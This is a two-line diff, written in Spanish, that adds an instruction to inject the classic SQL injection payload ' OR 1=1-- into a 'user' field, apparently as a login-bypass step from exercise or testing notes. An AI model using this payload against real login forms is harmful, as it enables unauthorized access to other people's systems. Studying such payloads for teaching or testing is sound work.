@@ -1,0 +1,2 @@
+En el campo user inyectar
+' OR 1=1--
